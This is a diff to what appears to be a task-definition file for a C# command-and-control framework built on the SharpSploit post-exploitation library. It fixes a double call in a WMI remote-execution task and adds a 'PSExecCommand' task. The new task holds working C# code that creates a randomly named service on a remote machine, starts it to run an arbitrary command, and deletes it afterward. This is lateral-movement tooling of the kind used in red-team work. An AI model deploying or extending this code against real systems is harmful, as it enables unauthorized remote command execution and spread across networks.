@@ -26,7 +26,7 @@
                 WMI.WmiExecuteResult result = WMI.WMIExecute(ComputerName, Command, Username, Password);
                 if (result != null)
                 {
-                    return new SharpSploitResultList<WMI.WmiExecuteResult> { WMI.WMIExecute(ComputerName, Command, Username, Password) }.ToString();
+                    return new SharpSploitResultList<WMI.WmiExecuteResult> { result }.ToString();
                 }
                 else
                 {
@@ -154,7 +154,7 @@
                 WMI.WmiExecuteResult result = WMI.WMIExecute(ComputerName, Command, Username, Password);
                 if (result != null)
                 {
-                    return new SharpSploitResultList<WMI.WmiExecuteResult> { WMI.WMIExecute(ComputerName, Command, Username, Password) }.ToString();
+                    return new SharpSploitResultList<WMI.WmiExecuteResult> { result }.ToString();
                 }
                 else
                 {
@@ -755,6 +755,170 @@
     - Name: System.IdentityModel.dll
       Location: net35\System.IdentityModel.dll
       DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PSExecCommand
+  Aliases:
+  - psexeccmd
+  Author:
+    Name: Daniel Duggan
+    Handle: _RastaMouse
+    Link: https://twitter.com/_RastaMouse
+  Description: Execute a command on a remote system using the Service Control Manager.
+  Help: ''
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using System.Linq;
+    
+    using SharpSploit.LateralMovement;
+    
+    public static class Task
+    {
+        public static string Execute(string ComputerName, string Command)
+        {
+            string randName = GenerateRandomString(8);
+
+            try
+            {
+                if (!SCM.CreateService(ComputerName, randName, "", Command))
+                {
+                    return "[x] Failed to create service";
+                }
+                if (!SCM.StartService(ComputerName, randName))
+                {
+                    SCM.DeleteService(ComputerName, randName);
+                    return $@"[+] Service {randName} created ({Command})";
+                }
+                if (!SCM.DeleteService(ComputerName, randName))
+                {
+                    return "[x] Failed to delete service";
+                }
+                
+                return $@"[+] Service {randName} created ({Command})";
+            }
+            catch (Exception e)
+            {
+                if (e.Message.Contains("Cannot start service"))
+                {
+                	  SCM.DeleteService(ComputerName, randName);
+                    return $@"[+] Service {randName} created ({Command})";
+                }
+                else
+                {
+                    return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
+                }
+            }
+        }
+
+        private static string GenerateRandomString(int length)
+        {
+            Random random = new Random();
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: ''
+    DefaultValue: ''
+    Description: ComputerName to launch the Command on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Command to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40\System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35\System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
